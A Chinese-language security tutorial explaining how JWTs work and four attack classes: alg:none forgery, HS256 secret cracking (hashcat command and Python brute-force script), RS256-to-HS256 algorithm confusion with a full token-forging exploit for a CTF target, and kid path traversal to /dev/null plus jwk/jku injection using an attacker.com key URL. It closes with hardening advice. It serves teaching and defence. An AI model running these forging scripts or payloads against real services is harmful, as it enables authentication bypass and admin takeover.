---
date: 2026-10-15
title: "JWT原理与攻击面（空加密none、密钥爆破、公私钥混淆、JWK注入）"
---
# 🪙 JSON Web Token (JWT) 深度攻防：底层加密规范与四大绝杀利用链

> [!TIP] 推荐前置知识点
> JWT 身份认证建立在现代密码学哈希、Base64URL 编码与公私钥加密体系之上。强烈建议先阅读：
> - 🔰 [[01-零基础入门前置指南与黑话工具字典]]：全局新手第一站，掌握 HTTP 报文标头结构、常用调试工具与安全法律红线。
> - 🌐 [[25-网络通信与路由交换攻防核心/01-TCP-IP与HTTP核心协议栈：三次握手、四次挥手与状态机攻防剖析]]：掌握 HTTP 请求头（Authorization、Cookie）与报文流转机制。
> - 🔒 [[25-网络通信与路由交换攻防核心/03-HTTPS与TLS握手解密内幕：证书信任链、会话密钥协商与SSL-Pinning绕过]]：理解公钥/私钥非对称加密与数字签名本质。

> [!NOTE] 📖 本篇长文精读导览与分节进度（建议阅读时间：19 分钟）
> - **模块 1：底层规范与数据结构** —— JWT 三段式骨架、Base64URL 编码规范（为什么去除 `=` 与特殊符号）。
> - **模块 2：密码学基础对照** —— 对称加密（HS256 共享密钥）vs 非对称加密（RS256 公私钥体系）白话心智模型。
> - **模块 3：四大绝杀攻击面演练**：
>   - 攻击面 1：**alg: none 算法置空漏洞**（签名剥离直通越权）
>   - 攻击面 2：**HS256 弱密钥离线爆破**（hashcat GPU 暴力破解字典攻防）
>   - 攻击面 3：**RS256 $\rightarrow$ HS256 公私钥算法混淆降级攻击**（用公开公钥作为 HMAC 密钥签名）
>   - 攻击面 4：**Header 参数高阶注入**（`kid` 目录遍历 `../../dev/null` 伪造、`jwk` 头部内联证书欺骗、`jku` 远程密钥劫持）
> - **模块 4：实战 CTF/靶场实战通关** —— 经典题目全流程复盘。
> - **模块 5：蓝队企业级纵深防御加固基线** —— 算法强白名单锁定、密钥长度与密钥隔离实践。

> [!NOTE] 模块前置语言与工具清单
> - **前置通关必备**：零基础读者强烈建议先通读全局导航 **[[01-零基础入门前置指南与黑话工具字典]]**，掌握安全法律红线、终端命令行、HTTP 报文骨架与黑话字典！
> - **环境依赖**：具备基础 Web 浏览器（Chrome/Firefox）抓包认知或轻量 Python 脚本执行能力。


> **技术演进背景**：随着前后端分离与微服务架构的普及，传统的服务端 Session 会话机制由于难以水平扩展，逐渐被**无状态的 JSON Web Token（JWT，RFC 7519）**所取代。
> JWT 将用户身份、角色与特权信息明文保存在客户端，服务端完全依赖**密码学数字签名**来确保数据不被篡改。
> 然而，许多开发者乃至主流 JWT 基础库，对算法白名单强制校验、公私钥类型隔离及头部可信度的处理存在严重误区，赋予了攻击者直接篡改 Payload 实现**垂直越权拿到系统最高管理员权限**的可能！

---

## 一、JWT 底层三段式结构与 Base64URL 编码规范

一个标准的 JWT 字符串由两个点号 `.` 分隔为三部分：
$$\mathbf{Header} \ . \ \mathbf{Payload} \ . \ \mathbf{Signature}$$

```mermaid
flowchart LR
    subgraph Part1 ["1. 头部 (Header)"]
        H["{'alg': 'HS256', 'typ': 'JWT', 'kid': 'key1'}"]
    end
    subgraph Part2 ["2. 负载 (Payload)"]
        P["{'sub': '1234', 'user': 'guest', 'role': 'user', 'exp': 1718000000}"]
    end
    subgraph Part3 ["3. 签名 (Signature)"]
        S["HMACSHA256(Base64URL(Header) + '.' + Base64URL(Payload), Secret)"]
    end
    Part1 --> Part2 --> Part3
```

> [!IMPORTANT]
> **Base64URL 算法细节（为什么不能用普通 Base64？）**：
> 标准的 Base64 编码字符集中包含 `+`、`/`，并且末尾常常带有补齐字符 `=`。
> * **冲突痛点**：JWT 通常放在 HTTP 标头或 URL 查询参数中传输。在 URL 规则中，`+` 会被解析为空格，`/` 会被当成目录层级，`=` 会被当成参数赋值，从而引发各种传输乱码！
> * **Base64URL 的转换修正**：
>   1. 将 `+` 替换为减号 `-`；
>   2. 将 `/` 替换为下划线 `_`；
>   3. **将末尾所有的填充符 `=` 全部剥离丢弃**！接收端按照长度自动补全还原。

> [!TIP] 小白前置扫盲：对称加密（HS256）与非对称加密（RS256）白话对照表
> | 维度 | 对称加密算法：`HS256` (HMAC-SHA256) | 非对称加密算法：`RS256` (RSA Signature) |
> | :--- | :--- | :--- |
> | **钥匙数量** | **仅有 1 把钥匙**（共享密码 `Secret`） | **有 2 把钥匙**（公钥 `Public Key` + 私钥 `Private Key`） |
> | **日常比喻** | **普通的防盗门钥匙**：锁门和开门都用这一把钥匙。 | **带投信口的保险箱**：公钥是公开的投信口（谁都能投信检验），私钥是开箱钥匙（只有管理员持有）。 |
> | **工作机制** | 签发 Token 用这串字符，验签 Token 还用这串字符。 | 签发 Token **必须用严格保密的私钥**，检验 Token **使用完全公开的公钥**。 |
> | **核心弱点** | 一旦 Secret 泄露或被爆破，攻击者即可任意伪造。 | 若服务端未严格校验算法类型，易引发**公私钥算法混淆降级攻击**！ |

---

## 二、四大核心攻击面深度剖析

```mermaid
flowchart TD
    A["JWT 攻击面分类"] --> B["1. 算法置空漏洞 (alg: none)"]
    A --> C["2. 弱密钥暴力破解 (HS256 Secret Brute-force)"]
    A --> D["3. 公私钥算法混淆 (RS256 -> HS256)"]
    A --> E["4. Header 参数注入 (kid 路径遍历 / JWK 注入)"]
```

---

### 1. 攻击面一：算法置空漏洞（`alg: none` 越权）

* **成因机理**：
  RFC 7519 标准中定义了一个特殊的算法 `"none"`，用于通信信道本身已具备 TLS/SSL 绝对保护且不需要数据完整性签名的场景。
  许多早期的 JWT 解析库（如 Node.js `jsonwebtoken`、Python `pyjwt`、PHP 各类库）在设计时**默认启用了对 `"none"` 算法的支持**，且直接信任用户请求中 Header 声明的 `alg`！
* **利用手法**：
  1. 将 Header 中的 `"alg"` 改为 `"none"`（部分库存在大小写校验缺陷，可测试 `"None"`, `"NONE"`, `"nOnE"`）；
  2. 将 Payload 中的 `"role": "user"` 改为 `"role": "admin"`；
  3. **彻底删除第三部分的 Signature，但必须保留第二个点号 `.`**！

#### 🔍 伪造构造对比：
* 原始 Token：`eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.Kx87f...`
* 攻击 Payload：`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.`
* 服务端收到后识别 `alg=none`，认为无需校验签名，直接信任 Payload 中的管理员身份！

---

### 2. 攻击面二：弱密钥暴力破解与任意伪造（HS256 签名窃取）

* **成因机理**：
  HS256（HMAC-SHA256）是一种对称加密算法，签名与验签使用同一个共享字符串（Secret）。许多开发者随手将 Secret 设置为 `123456`、`secret`、`password` 或公司域名。
* **离线字典爆破实战（无需向服务器频繁发包，速度可达数亿次/秒）**：

#### (1) 使用工业级 Hashcat 爆破：
```bash
# -m 16500 对应 JWT (Secret + SHA256) 模式
hashcat -m 16500 jwt_token.txt rockyou.txt --force
```

#### (2) 编写轻量级 Python 爆破脚本：
```python
import hmac
import hashlib
import base64

token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCJ9.db5u5..."
header_payload, original_sig = token.rsplit('.', 1)

with open("passwords.txt", "r") as f:
    for line in f:
        secret = line.strip().encode()
        calc_sig = base64.urlsafe_b64encode(
            hmac.new(secret, header_payload.encode(), hashlib.sha256).digest()
        ).decode().rstrip('=')
        if calc_sig == original_sig:
            print(f"[+] Cracked Secret Found: {line.strip()}")
            break
```
* 一旦拿到 Secret，攻击者可在本地任意修改 Payload 并计算出 100% 合法的 Signature 签名！

---

### 3. 攻击面三：公私钥算法混淆（RS256 $\rightarrow$ HS256 降级打击）

这是 JWT 领域最精妙、最具破坏力的高阶逻辑漏洞！

#### 🔍 漏洞底层原理剖析：
* **原本设计（RS256 非对称加密）**：
  * 服务端拥有两个密钥：**私钥 Private Key**（严格保密，用于签发 Token）与 **公钥 Public Key**（公开暴露，用于验证签名）。
  * 正常流程：验签时，服务端调用 `jwt.verify(token, publicKey)`，底层使用 RSA 数学算法验证签名。
* **漏洞致命点**：
  后端验签逻辑中**没有写死验证算法**，而是**动态读取客户端传入的 Header 中的 `alg` 参数**！
  ```javascript
  // 脆弱代码示例
  jwt.verify(token, serverPublicKey); // 未传入 algorithms: ['RS256']
  ```
* **攻击者如何完成降级与对称伪造？**
  1. 攻击者将 Header 中的 `"alg"` 从 `"RS256"` 篡改为 **`"HS256"`**；
  2. 获取服务端的 RSA 公钥（通常是公开暴露的，如 `https://target/jwks.json` 或 `public.pem`）；
  3. **核心绝杀**：攻击者在本地使用该 **公开的 RSA 公钥字符串作为对称加密的 Secret**，计算 HMAC-SHA256 签名！
  4. 当数据包送达服务端：
     * 服务端解析 Header，看到 `alg: "HS256"`，误以为这是一个对称加密 Token！
     * 服务端取出代码里原本准备好的 `serverPublicKey` 变量作为 HMAC 密钥进行验签；
     * **攻击者使用的 HMAC 密钥与服务端读取的密钥完全一致**！签名校验完美通过！

---

### 4. 攻击面四：Header 参数注入（`kid` 路径遍历与 JWK 注入）

在标准 JWT Header 中，除了常用的 `alg`（算法）和 `typ`（类型）之外，规范还允许携带一些**辅助定位密钥**的高阶参数：

> [!NOTE] 小白前置扫盲：Header 扩展参数字典
> * **`kid`（Key ID，密钥编号）**：在大型微服务系统中，服务端可能有几十个密钥（按版本或日期轮换）。`kid` 的作用就像“储物柜编号”，告诉后端“这次签名请用 3 号柜里的密钥文件来验证”。
> * **`jwk`（JSON Web Key）**：直接把公钥的完整 JSON 数据结构**嵌入在 Header 内部**带给服务端。
> * **`jku`（JWK Set URL）**：给出一个网址链接（URL），告诉服务端“请访问这个网页下载我的最新公钥集合”。

由于许多开发者直接将这些参数传入底层文件读取函数或网络请求库，导致了两个极具杀伤力的越权漏洞：

---

#### (1) `kid` 路径遍历与 `/dev/null` 空密钥绝杀（Path Traversal）

##### 💡 小白扫盲一：什么是 `../../`（目录穿越 / 路径跳跃）？
* 在操作系统（无论是 Linux 还是 Windows）的文件路径体系中：
  * **单点 `.`** 代表**当前所在的目录**（当前文件夹）；
  * **双点 `..`** 代表**上一级父目录**（返回到上一层文件夹）；
  * **斜杠 `/`** 是不同层级目录的分隔符；
  * **`../`** 组合在一起，意思就是**“跳出当前文件夹，返回到上一层”**！
* **为什么连写很多个 `../../../../../` 能跳出限制？**
  * 假设后端代码这样写：
    ```python
    # 开发者以为 kid 只是单纯的文件名（如 "key1.pem"）
    key_path = "/var/www/app/keys/" + header["kid"]
    with open(key_path, "r") as f:
        secret = f.read()
    ```
  * 如果攻击者传入普通的 `"kid": "key1.pem"`，拼接后的路径就是正常的 `/var/www/app/keys/key1.pem`。
  * 但如果攻击者传入 `"kid": "../../../../../dev/null"`，拼接后的路径变成了：
    ```text
    /var/www/app/keys/../../../../../dev/null
    ```
  * 操作系统在解析该路径时，每遇到一个 `..` 就往上回退一级：
    1. 从 `keys/` 回退到 `app/`
    2. 从 `app/` 回退到 `www/`
    3. 从 `www/` 回退到 `var/`
    4. 从 `var/` 回退到系统的**最顶层根目录 `/`**！
  * **最关键的操作系统特性**：在 Linux 中，根目录 `/` 已经是整块硬盘的最顶端了，它上面没有任何父目录！就算你写 100 个 `../../../../`，系统解析到根目录后就只能停在根目录 `/`。因此，后面的 `/dev/null` 就会精确指向**操作系统根目录下的 `/dev/null` 文件**！
  * 这种利用连续 `..` 突破程序预设文件夹限制、访问到系统任意文件的技术，在网络安全中被称为**“路径遍历（Path Traversal）”**或**“目录穿越”**。

---

##### 💡 小白扫盲二：什么是 `/dev/null`（Linux 黑洞 / 空设备文件）？
* 在 Linux 系统哲学中有一句经典名言：**“一切皆文件”**。无论是键盘、显示器、硬盘分区还是内存虚拟接口，在 Linux 下都被映射为一个文件，存放在系统根目录的 `/dev/`（Device，设备）文件夹中。
* `/dev/` 文件夹下有一个最特殊的虚拟设备文件，叫做 **`/dev/null`**（常被称为**系统黑洞**或**空设备**）：
  * **写入特性（吞噬一切）**：任何往 `/dev/null` 写入的数据（例如 `echo "test" > /dev/null`）都会瞬间被内核彻底丢弃蒸发，绝不占用一丁点磁盘空间；
  * **读取特性（永远为空，漏洞致命破绽）**：任何程序尝试从 `/dev/null` 读取数据时，Linux 内核会立即返回一个 `EOF`（End of File，文件结束信号）——**这意味着从中读取出来的结果永远是 0 字节，也就是一个空字符串（`""`）！**

---

##### ⚡ 漏洞攻击完整闭环（普通用户瞬间升天为超级管理员）：
1. **构造恶意 Token**：攻击者拦截合法的 JWT，篡改 Payload 中的身份为 `"role": "admin"`；
2. **注入黑洞路径**：将 Header 中的 `kid` 参数篡改为路径穿越 payload：
   ```json
   {
     "alg": "HS256",
     "typ": "JWT",
     "kid": "../../../../../dev/null"
   }
   ```
3. **服务端被诱骗**：
   * 服务端执行 `open("/var/www/app/keys/" + kid)`，顺着 `../../` 一路倒退到根目录，最终打开了 `/dev/null`；
   * 服务端读取密钥：`secret = f.read()`，由于读取的是黑洞文件，变量 `secret` 被赋值为**空字符串 `""`**！
   * 服务端误以为系统的真实签名密钥就是 `""`。
4. **攻击者本地空密钥签名**：
   * 攻击者在本地写 Python 脚本，直接指定 `secret = ""`（空字符串），计算出合法的 HMAC-SHA256 签名并拼接到第三段；
5. **数据包放行**：
   * 服务端拿着自己的空密钥 `""` 计算期望签名，发现与攻击者提交的签名**100% 字符完全一致**！
   * 签名校验通过，服务端直接信任了 Payload 里的 `"admin"`，攻击者越权夺取全站最高管理员权限！

---

#### (2) `jwk` 头部公钥自注入与 `jku` 伪造（Self-Signed JWK / JKU Bypass）

##### 💡 通俗生活比喻：
* **正常流程**：公钥相当于你留在银行系统里的“个人印鉴卡底册”。当你要支取大笔款项时，银行柜员拿出系统里预存的底册来核对你的签名，确认无误才放行。
* **`jwk` 漏洞（自签自带公钥）**：
  * 部分开发者调用的 JWT 校验库支持在 Header 中解析 `"jwk"` 对象。
  * 如果开发者没有限制公钥必须来自系统自身，而是**直接把 Header 里带进来的公钥当作验签标准**，这就相当于：
    * 骗子伪造了一份支票，并在支票右上方夹了一枚自己私刻的印章（`jwk`）；
    * 骗子对银行柜员说：“系统里的印章过时了，请用我夹在支票上的这枚新印章来核对签名”；
    * 毫无防备的柜员直接用骗子自带的印章盖在支票上核对，结果自然是“完全匹配”并顺利将巨款转走！
  * **攻击手法**：攻击者在本地用 `openssl` 生成属于自己的一对全新 RSA 公私钥；将公钥放入 Header 的 `"jwk"` 字段，用私钥对 Payload 签名。送达后端后，后端直接用攻击者提供的公钥验签，校验 100% 成功！
* **`jku` 漏洞（远程公钥诱骗下载）**：
  * Header 中的 `"jku"` 允许指定一个获取公钥列表的 URL（如 `"jku": "https://trusted.com/keys.json"`）。
  * 若服务端未校验域名白名单，攻击者可将其替换为黑客受控的服务器：
    `"jku": "http://attacker.com/my_keys.json"`
  * 服务端收到 Token 后，主动向黑客服务器发送 HTTP 请求下载黑客的公钥，随后用该公钥验签通过！这不仅造成认证绕过，还能结合 SSRF 探测内网！

---

## 三、CTF 实战靶场案例复现（公私钥算法混淆夺旗）

### 靶场情境：微服务管理面板鉴权

1. 登录普通用户后，抓包获得当前 Token：
   `eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.j8F...`
2. 网站源码泄露了获取公钥的接口：`GET /public.pem`，内容为标准的 PEM 格式公钥：
   ```text
   -----BEGIN PUBLIC KEY-----
   MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3f...
   -----END PUBLIC KEY-----
   ```

### 1. 编写算法混淆伪造 Exploit（Python 3）

```python
#!/usr/bin/env python3
import json
import base64
import hmac
import hashlib

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

# 1. 篡改 Header: 将 RS256 改为 HS256
header = {"alg": "HS256", "typ": "JWT"}
# 2. 篡改 Payload: 提权为 admin
payload = {"user": "admin", "role": "admin"}

part1 = b64url(json.dumps(header))
part2 = b64url(json.dumps(payload))
signing_input = f"{part1}.{part2}".encode()

# 3. 读取公开的 RSA 公钥作为对称密钥
with open("public.pem", "r") as f:
    public_key = f.read().encode()

# 4. 使用公钥进行 HMAC-SHA256 计算签名
signature = hmac.new(public_key, signing_input, hashlib.sha256).digest()
part3 = b64url(signature)

forged_token = f"{part1}.{part2}.{part3}"
print(f"[+] Forged Admin Token:\n{forged_token}")
```

### 2. HTTP 请求投递与权限提升验证

```http
GET /admin/flag HTTP/1.1
Host: target.ctf:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.d1e7hJ...

HTTP/1.1 200 OK
Content-Type: application/json

{
    "status": "success",
    "message": "Welcome Administrator!",
    "flag": "flag{jwt_4lg0r1thm_c0nfus10n_rs256_t0_hs256_m4st3r}"
}
```
通过算法混淆成功将普通用户提升为系统超级管理员，读取终极 Flag！

---

## 四、安全加固金标准

1. **强行锁定算法白名单（绝不信任客户端 Header）**：
   在验签代码中，必须显式硬编码限定允许的算法：
   ```python
   # ✅ 安全写法 (PyJWT)
   jwt.decode(token, public_key, algorithms=['RS256']) # 彻底拒绝 HS256 与 none
   ```
2. **彻底禁用 `none` 算法**：
   确保框架配置关闭任何空签名放行开关。
3. **高熵密钥管理**：
   对称加密密钥长度不少于 256 位，且采用强随机数生成器生成（如 `openssl rand -hex 32`），坚决杜绝弱口令。
4. **严格过滤 `kid` 与外部 URL**：
   `kid` 只能从预定义的白名单数据库 ID 提取，严禁直接拼接为文件系统路径或 SQL 语句。

---

## 🔗 相关双向链接
- 上级模块：[[09-认证授权与业务逻辑漏洞]]
- 并发对抗：[[02-条件竞争（Race Condition）与并发发包实战]]
- 越权分析：[[03-越权与密码重置逻辑缺陷]]
- 知识地图：[[00-Web安全与CTF知识地图总览]]
